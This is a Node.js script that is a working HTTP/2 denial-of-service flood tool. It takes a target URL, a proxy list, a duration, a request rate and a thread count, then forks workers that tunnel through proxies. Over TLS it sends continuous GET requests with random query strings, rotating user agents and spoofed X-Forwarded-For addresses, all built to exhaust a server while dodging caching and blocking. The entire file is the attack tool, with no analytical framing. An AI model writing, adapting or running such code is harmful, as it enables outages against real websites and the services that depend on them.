process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});
require('events').EventEmitter.defaultMaxListeners = 0;

const fs = require('fs');
const url = require('url');
const path = require("path");
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');

var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7){
    console.log('HTTP/2 Optimized | Zaparka Logic');
    console.log('node ' + file + ' <host> <proxies> <duration> <rate> <threads>');
    process.exit(0);
}

var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[5];
var target = process.argv[2];

var parsed = url.parse(target);
process.setMaxListeners(0);

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
];

function spoof(){
    return `${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}`;
}

const cplist = [
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
];

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Header = new NetSocket();

if (cluster.isMaster){
    for (let i = 0; i < process.argv[6]; i++){
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, process.argv[4] * 1000);
} else {
    setInterval(startflood, 1);
}

function startflood(){
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;
    
    const parsedProxy = proxyAddr.split(":");
    const cipper = randomElement(cplist);
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsed.host + ":443",
        timeout: 1
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsed.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method'
        };

        const tlsConn = tls.connect(443, parsed.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsed.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < rate; i++) {
                    const headers = buildHeaders();
                    const req = client.request(headers);
                    
                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });

                    req.on("error", () => {
                        req.destroy();
                    });

                    req.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        tlsConn.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        tlsConn.on("end", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsed.path || "/") + rand_query;

    return {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsed.host,
        ":path": rand_path,
        "user-agent": randomElement(UAs),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "referer": target,
        "x-forwarded-for": spoof(),
        "upgrade-insecure-requests": "1"
    };
}
